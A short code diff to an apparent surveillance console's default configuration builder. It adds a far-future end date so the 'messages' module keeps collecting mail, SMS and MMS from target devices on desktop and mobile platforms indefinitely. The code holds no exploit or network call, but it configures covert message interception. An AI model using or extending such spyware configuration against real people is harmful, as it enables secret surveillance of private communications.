@@ -8,6 +8,8 @@ package it.ht.rcs.console
   public class DefaultConfigBuilder
   {
     
+    public static const FOREVER_DATE:String = '2100-01-01 00:00:00';
+    
     private static var agent:Agent;
     
     private static const formatter:DateFormatter = new DateFormatter();
@@ -152,9 +154,9 @@ package it.ht.rcs.console
         
         {
           module: "messages",
-          mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), maxsize: 100000}},
-          sms:  {enabled: true, filter: {history: true, datefrom: formatter.format(today)}},
-          mms:  {enabled: true, filter: {history: true, datefrom: formatter.format(today)}},
+          mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE, maxsize: 100000}},
+          sms:  {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}},
+          mms:  {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}},
           _type: "desktop,mobile",
           _platform: "windows,ios,blackberry,winmo,symbian,android"
         },
